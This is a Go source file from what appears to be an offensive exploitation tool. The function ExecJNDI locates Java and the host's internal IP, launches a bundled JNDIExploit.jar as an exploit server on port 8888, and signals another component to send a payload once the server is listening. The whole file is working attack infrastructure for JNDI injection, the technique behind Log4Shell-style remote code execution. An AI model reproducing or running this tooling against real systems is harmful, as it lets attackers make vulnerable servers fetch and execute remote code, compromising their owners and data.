package execjndi

import (
	"fmt"
	"myapp/lib/findjava"
	"myapp/lib/sysinfo"
	"os/exec"
	"strings"
	"sync"
)

func ExecJNDI(startPayload chan<- bool, logChan chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	jndipath := "./dependencies/jndi/JNDIExploit.jar"
	javapath := findjava.FindPath()
	ip, err := sysinfo.GetIntIP()
	if err != nil {
		logChan <- fmt.Sprintf("[+] Error: %v", err)
		return
	}
	logChan <- "[+] Starting JNDI exploit server..."
	javapathcmd := exec.Command(javapath, "-jar", jndipath, "-i", ip.String(), "-p", "8888")
	stdout, err := javapathcmd.StdoutPipe()
	if err != nil {
		logChan <- fmt.Sprintf("[+] Error creating stdout pipe: %v", err)
		return
	}
	err = javapathcmd.Start()
	if err != nil {
		logChan <- fmt.Sprintf("[+] Error starting command: %v", err)
		return
	}
	var output strings.Builder
	buf := make([]byte, 1024)
	for {
		n, err := stdout.Read(buf)
		if err != nil {
			break
		}
		logLine := string(buf[:n])
		output.Write(buf[:n])
		logChan <- logLine
		if strings.Contains(output.String(), "[+] HTTP Server Start Listening on 8888") {
			startPayload <- true
		}
	}
	err = javapathcmd.Wait()
	if err != nil {
		logChan <- fmt.Sprintf("[+] Error: %v", err)
	}
	close(logChan)
}
